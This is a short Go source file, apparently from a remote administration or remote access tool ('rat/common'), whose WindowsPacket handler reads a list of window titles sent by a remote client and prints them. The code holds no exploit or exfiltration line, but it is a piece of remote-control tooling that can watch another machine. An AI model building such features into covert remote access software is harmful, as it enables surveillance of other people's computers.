package main

import (
	"fmt"
	"rat/common"
)

const ()

type WindowsPacket struct {
}

func (packet WindowsPacket) GetHeader() common.PacketHeader {
	return common.WindowsHeader
}

func (packet WindowsPacket) Write(c *Client) error {
	return nil
}

func (packet WindowsPacket) Read(c *Client) error {
	len, _ := c.ReadInt()

	for i := 0; i < len; i++ {
		title, _ := c.ReadString()

		fmt.Println(title)
	}

	return nil
}
